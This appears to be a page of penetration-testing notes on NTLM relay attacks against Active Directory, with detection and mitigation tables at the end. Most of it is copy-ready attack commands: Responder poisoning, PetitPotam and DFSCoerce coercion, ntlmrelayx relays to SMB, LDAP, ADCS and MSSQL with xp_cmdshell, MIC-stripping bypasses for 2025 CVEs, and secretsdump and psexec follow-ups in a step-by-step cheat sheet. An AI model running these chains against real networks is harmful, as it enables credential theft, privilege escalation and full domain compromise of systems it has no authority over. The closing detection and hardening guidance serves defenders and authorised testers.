+++
title = 'NTLM Relay'
date = 2026-10-30
type = 'notes'
weight = 30
toc = true
tags = ['active-directory', 'ntlm', 'relay', 'coercion']
+++

## How NTLM Relay Works

NTLM authentication is challenge-response: the server sends a challenge, the client answers with a hash of the challenge using its password hash. An attacker who can **position themselves between client and server** can forward the challenge/response to a *different* service and authenticate as the victim — without cracking anything.

The attack has two halves:

1. **Coerce or poison** a victim into authenticating to you (LLMNR/NBT-NS/mDNS poisoning, or a coercion RPC call).
2. **Relay** that authentication to a target service where the victim's account has rights.

> **Relay succeeds only when the target does not require signing or channel binding.** Check this before spending time: SMB signing must be `not required`, LDAP signing and LDAP channel binding must be off, and for HTTPS enrollment the CA Web Enrollment endpoint must accept NTLM. **But** — 2025–2026 research changed this assumption. Drop the MIC and CVE-2025-54918 strip the protections that were supposed to block relay even when signing is enforced.

---

## Prerequisites and Checks

| Target | Requirement | Check |
|---|---|---|
| **SMB** | SMB signing **not required** | `nmap -p445 --script smb2-security-mode <ip>` (look for "message signing enabled but not required"), `nxc smb <ip> --gen-relay-list relay.txt` |
| **LDAP** | LDAP signing + channel binding not enforced | Check `LdapEnforceChannelBinding` and `LDAPServerIntegrity` on the DC |
| **LDAPS** | Channel binding not enforced | `LdapEnforceChannelBinding` = `0` or `1` |
| **HTTP ADCS** | Web Enrollment / ICPR reachable and NTLM allowed | `curl -I http://<CA>/certsrv/` |
| **MSSQL** | NTLM auth accepted; no EPA | `nmap -p1433 --script ms-sql-info <ip>` |
| **Any** | Victim account can authenticate to target | Domain users can usually auth to SMB/LDAP; admin rights determine impact |

**Build the relay target list:**

```bash
nxc smb 172.16.5.0/24 --gen-relay-list relay.txt
# or from a shell:
nmap -p445 --open --script smb2-security-mode 172.16.5.0/24 -oG smb.txt
```

**Disable the protocols you are relaying in Responder** — otherwise Responder answers the auth itself and `ntlmrelayx` never sees it:

- `/etc/responder/Responder.conf`: set `SMB = Off` and/or `HTTP = Off` (keep the others on for capture).
- Run Responder with `-A` (analyze) if you only want to see traffic, or `-w`/`-r` for WPAD.

---

## The 2025–2026 CVE Landscape — What Actually Works Now

The classic relay model — "no signing = relay works" — is incomplete. Three vulnerabilities change what is possible:

### CVE-2025-33073 — NTLM Reflection Bypass (June 2025 patch)

**What it does:** A reflection variant of NTLM relay. Classic relay captures authentication intended for service A and replays it to service B on a *different* host. Reflection turns this **inward**: the captured authentication is replayed **back to the same host**, entering the victim's own NTLM authentication loop. The Windows NTLM stack in `msv1_0.dll` did not uniquely bind an authentication context to a caller identity when the NEGOTIATE and AUTHENTICATE messages arrived on the same machine.

**Why it matters:** It removes the **admin prerequisite** that previously limited relay. An attacker with **any low-privilege domain account** (read-only is sufficient) can coerce a privileged service — including `lsass.exe` running as SYSTEM — to authenticate to attacker-controlled infrastructure, then relay that authentication back to the same host and receive a **SYSTEM token**.

**Attack chain (automated by `cupntlm`):**

1. **Inject a DNS record** in AD DNS (allowed for `Authenticated Users` by default) pointing a chosen name at the attacker.
2. **Coerce authentication** with PetitPotam, DFSCoerce, or PrinterBug.
3. **Relay the NTLM authentication** back to the target with `ntlmrelayx.py`.
4. Receive a shell, dump secrets, or configure RBCD.

```bash
# cupntlm — automated CVE-2025-33073 chain
git clone https://github.com/EgCupCake/cupntlm.git && cd cupntlm && sudo bash setup.sh
sudo python3 cupntlm.py check --domain lab.local --user pentester --pass 'P@ss' \
  --dc-ip 10.0.0.1 --relay-ip 192.168.1.100
sudo python3 cupntlm.py single --targets targets.txt --domain lab.local \
  --user pentester --pass 'P@ss' --dc-ip 10.0.0.1 --relay-ip 192.168.1.100
```

**Preconditions:** SMB signing **disabled** on the relay target, a valid low-privilege domain account, network access to the DC (LDAP 389, SMB 445).

### CVE-2025-54918 — Partial MIC Removal (September 2025 patch)

**What it does:** A logic error in the NTLM stack's validation routine. By stripping the **Message Integrity Code (MIC)** and specific flags (`msAvFlags`) from the `NTLMAUTHENTICATE_MESSAGE`, an attacker can relay authentication to services that **normally enforce signing** — including LDAP/S and SMB with signing required.

**Why it matters:** A host can be **patched against CVE-2025-33073 but still vulnerable** to CVE-2025-54918. The two are independent logic flaws in different parts of the stack.

**Relay with `ntlmrelayx`:**

```bash
sudo impacket-ntlmrelayx -smb2support -t ldaps://10.0.1.202 --delegate-access --remove-mic
```

`--remove-mic` strips the MIC, allowing the relayed authentication to be accepted by LDAP/S even with signing enforced.

### CVE-2019-1040 — Drop the MIC (still relevant)

**What it does:** The original MIC-stripping vulnerability. It bypasses SMB signing by removing the MIC during SMB authentication, enabling **cross-protocol relay** — coerce SMB authentication, relay it to LDAP, and configure RBCD.

**The full chain (requires at least two DCs):**

1. Compromise any user or machine in the domain.
2. Identify a DC vulnerable to CVE-2019-1040.
3. **Coerce a second DC** to authenticate to the attacker.
4. **Drop the MIC** and relay authentication to **LDAP** on the vulnerable DC.
5. Use the relayed LDAP session to **add a machine account** via Machine Account Quota.
6. Use the same session to **trust that machine for delegation via RBCD**.

```bash
sudo impacket-ntlmrelayx -smb2support -t ldaps://10.0.1.202 --delegate-access --remove-mic
```

### SMB → LDAPS cross-protocol relay (channel binding bypass)

Even with SMB signing and LDAP channel binding **both enforced**, research demonstrates a **cross-protocol relay from SMB to LDAPS**. The technique strips specific NTLMSSP flags — `Negotiate Always Sign`, `Negotiate Seal`, `Negotiate Sign` — while preserving the MIC, bypassing multiple controls at once.

> **Condition:** LDAP relay requires **signing and channel binding to be unenforced** on the DC. If LDAP signing is enforced but channel binding is absent, relay to `ldaps://` still works — `ntlmrelayx` handles it automatically.

---

## Poisoning with Responder

```bash
sudo responder -I eth0 -wv
```

Responder captures NetNTLMv1/v2 hashes from LLMNR, NBT-NS, mDNS, WPAD, and rogue SMB/HTTP servers. **NetNTLMv2 can only be cracked offline** (`hashcat -m 5600`); it cannot be used for pass-the-hash. **NTLMv1** can be cracked much faster (`-m 5500`) and, if the server accepts it, may be relayed more easily.

> **Responder-NG** (2026 fork) adds reliability and Windows platform handling, with rogue authentication servers for HTTP, SMB, MSSQL, FTP, LDAP, Kerberos, DNS, and more.

---

## Coercing Authentication

When you cannot poison (no broadcast traffic), force a privileged machine account to authenticate to you. The matrix below compares the available primitives:

| Method | RPC Interface | Function | Auth Required? | Target |
|---|---|---|---|---|
| **PetitPotam** | MS-EFSR (`lsarpc`) | `EfsRpcOpenFileRaw` + variants | **No** (unpatched); yes on patched | DC / any |
| **PrinterBug** | MS-RPRN (`spoolss`) | `RpcRemoteFindFirstPrinterChangeNotificationEx` | Yes (domain user) | Any with Spooler |
| **DFSCoerce** | MS-DFSNM (`netdfs`) | `NetrDfsRemoveStdRoot` / `NetrDfsAddStdRoot` | Yes (domain user) | DC |
| **ShadowCoerce** | MS-FSRVP (`fssagent`) | `IsPathShadowCopied` | Yes (domain user) | File servers |
| **MSEven** | MS-EVEN (`eventlog`) | `ElfrOpenBELW` | Yes (domain user) | Any |
| **Coercer** | Meta-tool | Tries every vector | Varies | Any |

> **PetitPotam has multiple EFS function variants** — `EfsRpcOpenFileRaw` was patched in November 2021, but `EfsRpcDecryptFileSrv`, `EfsRpcQueryUsersOnFile`, and `EfsRpcQueryRecoveryAgents` are partially patched and may still work depending on the build.

```bash
# Unauthenticated (unpatched)
python3 PetitPotam.py <attacker-ip> <dc-ip>

# Authenticated (patched systems)
python3 PetitPotam.py -u user -p password -d domain.com <attacker-ip> <dc-ip>

# DFSCoerce
python3 dfscoerce.py -u user -p pass <attacker-ip> <dc-ip>

# Coercer — tries every vector
python3 Coercer.py -u user -p pass -d domain <attacker-ip> <dc-ip>
```

Run `ntlmrelayx` first, then trigger the coercion.

---

## Relaying with Impacket `ntlmrelayx`

### SMB relay

```bash
# Relay to a list of hosts
sudo ntlmrelayx.py -tf relay.txt -smb2support

# Interactive SMB session (requires admin on the target)
sudo ntlmrelayx.py -t smb://172.16.5.10 -smb2support -i
```

What you get: SAM dump, a created user, or an interactive SMB shell — depending on whether the victim is a local admin on the target.

### LDAP / LDAPS relay

```bash
# Grant a user DCSync rights
sudo ntlmrelayx.py -t ldap://172.16.5.5 --escalate-user <our-user> -smb2support

# Add a computer account and configure RBCD
sudo ntlmrelayx.py -t ldaps://172.16.5.5 --add-computer --delegate-access -smb2support

# Shadow Credentials
sudo ntlmrelayx.py -t ldaps://172.16.5.5 --shadow-credentials -smb2support
```

### ADCS ESC8 — HTTP relay

```bash
sudo ntlmrelayx.py -t http://<CA-HOST>/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support
```

The relayed machine account (`DC01$`) receives a **certificate**, usable with PKINIT to get a TGT and DCSync.

### MSSQL relay

```bash
# Relay to MSSQL and execute a query
sudo ntlmrelayx.py -t mssql://192.168.1.201 -smb2support -q "SELECT IS_SRVROLEMEMBER('sysadmin')"

# Relay to MSSQL with xp_cmdshell
sudo ntlmrelayx.py -t mssql://192.168.1.30 -smb2support -q "EXEC xp_cmdshell 'whoami'"
```

MSSQL relay is especially useful in **SCCM/MECM** environments, where the site database server often trusts the management point's machine account.

### SOCKS proxy mode — keep relayed sessions alive

```bash
sudo ntlmrelayx.py -tf relay.txt -smb2support -socks
# Then use the relayed sessions interactively:
proxychains impacket-secretsdump -no-pass -socks corp.local/admin@192.168.1.10
```

`-socks` keeps the authenticated sessions open, so you can use `proxychains` to pivot through them with other tools.

---

## SMB Relay to a Domain Controller — Why It Usually Fails

Domain controllers require **SMB signing by default**. Relaying a machine account to `smb://<dc>` therefore fails with `STATUS_ACCESS_DENIED`. Use **LDAP/LDAPS** or **ADCS HTTP** instead, and keep SMB relay for member servers and workstations.

> **But:** CVE-2025-33073 and CVE-2025-54918 change this. If the DC is unpatched, **SMB → LDAPS reflection** can succeed even with signing enforced — see the CVE section above.

---

## Relay Cheat Sheet

```bash
# 1. Discover relayable hosts
nxc smb 172.16.5.0/24 --gen-relay-list relay.txt

# 2. Disable SMB/HTTP in Responder, start it
sudo responder -I eth0 -wv

# 3. Start the relay — choose the target
# SMB
sudo ntlmrelayx.py -tf relay.txt -smb2support

# LDAP (RBCD)
sudo ntlmrelayx.py -t ldaps://<dc> --delegate-access --remove-mic -smb2support

# ADCS ESC8
sudo ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController -smb2support

# SOCKS
sudo ntlmrelayx.py -tf relay.txt -socks -smb2support

# 4. Coerce a victim
python3 PetitPotam.py <attacker-ip> <dc-ip>

# 5. Use the result
impacket-secretsdump -just-dc <domain>/<user>@<dc> -k -no-pass      # LDAP
impacket-psexec <domain>/<user>@<target> -hashes :<hash>            # SMB admin relay
certipy auth -pfx dc01.pfx -dc-ip <dc>                                # ADCS ESC8
```

---

## Detection

| Event | Signal |
|---|---|
| **4624** (logon) with `AuthenticationPackageName: NTLM` | NTLM authentication to a service that **should** be using Kerberos — the primary relay detection |
| **4624** type 3 with **WorkstationName and source IP disagreeing** | Coerced authentication: the claimed workstation does not match the network address |
| **5145** (network share access) to `lsarpc`, `efsrpc`, `spoolss`, `netdfs` from an odd client | Coercion attempt on the RPC endpoint |
| **4625** (failed logon) | May indicate a failed relay attempt |
| **4776** (NTLM credential validation) | NTLM validation from an unexpected host |
| **Machine-account auth to the CA** from an unexpected host | ADCS ESC8 relay |

> **The key detection gap:** many environments do not baseline **NTLM usage** at all. A relayed session appears as a legitimate logon from the victim's account — the source address is yours, which is the tell. If 4624 does not record the package, or if the environment treats NTLM as normal, relay goes unnoticed.

---

## Mitigation

| Control | Registry / GPO | Recommended Value |
|---|---|---|
| **SMB signing (clients)** | GPO: Digitally sign communications (always) | `5` (DCs), `3` (clients) |
| **SMB signing (servers)** | RequireSecuritySignature | `1` |
| **LDAP signing** | `LDAPServerIntegrity` | `2` (Required) |
| **LDAP channel binding** | `LdapEnforceChannelBinding` | `2` (Always) |
| **NTLM restriction** | Network security: Restrict NTLM | Audit, then block |
| **AD DNS ACLs** | Remove `Create all child objects` from `Authenticated Users` | Blocks CVE-2025-33073 DNS injection |
| **Print Spooler** | Disable on DCs | Removes PrinterBug coercion surface |
| **Patch level** | June 2025 (CVE-2025-33073), September 2025 (CVE-2025-54918), November 2025 (CVE-2019-1040 lineage) | Check `systeminfo` / WSUS |

> **EPA (Extended Protection for Authentication)** adds channel binding to NTLM authentication, binding it to the TLS session — the strongest single mitigation when applied consistently. But EPA must be **consistent**; a single unprotected endpoint reopens the path.

---

## Field Notes

- **CVE-2025-33073 changed the prerequisite bar.** Any domain user (read-only is enough) can now coerce `lsass.exe` and relay it — you no longer need admin access to start the chain.
- **CVE-2025-54918 bypasses signing enforcement.** A host patched against 2025-33073 may still accept a MIC-stripped relay to LDAP/S.
- **Drop the MIC is still the RBCD setup primitive.** When LDAP signing is enforced, `--remove-mic` + `--delegate-access` is the chain.
- **`--remove-mic` is not universal.** It requires a vulnerable target. Check the patch level before assuming it works.
- **ADIDNS is the CVE-2025-33073 delivery mechanism.** `Authenticated Users` can create DNS records by default — removing that permission is a real mitigation.
- **SMB relay to a DC still fails by default.** Use LDAP or ADCS HTTP unless the DC is unpatched against the 2025 CVEs.
- **Detection is an NTLM baseline problem.** If you do not alert on NTLM to services that should use Kerberos, relay is invisible.
- **Only perform poisoning/relay on networks you are authorized to test.** On shared lab networks, poisoning can disrupt other students' traffic.

---

## Quick Reference — New Additions (2025–2026)

| Item | Type | What it adds |
|---|---|---|
| **CVE-2025-33073** | NTLM reflection | Any domain user → SYSTEM on non-SMB-signing hosts; DNS injection + coercion + relay |
| **cupntlm** | Automated exploit | Chains DNS record injection, PetitPotam, and `ntlmrelayx` in one workflow |
| **CVE-2025-54918** | Partial MIC removal | Relay to LDAP/S with signing enforced via `--remove-mic` |
| **CVE-2019-1040 (Drop the MIC)** | MIC stripping | Cross-protocol SMB → LDAP relay → RBCD |
| **SMB → LDAPS channel binding bypass** | Cross-protocol relay | Bypasses both signing and channel binding |
| **MSSQL relay** | New target | `ntlmrelayx -t mssql://` — SCCM/MECM abuse |
| **Responder-NG** | Tool fork | Windows platform handling, expanded rogue servers |
| **Coercer** | Meta-tool | Tries every coercion vector automatically |

This file sits alongside the **ADCS Attacks** and **Kerberos Delegation** notes: relay is the coercion-to-credential bridge, and the CVE-2025-33073/54918/Drop-the-MIC chains are how you reach RBCD or ESC8 when the classic "no signing" precondition is closed.
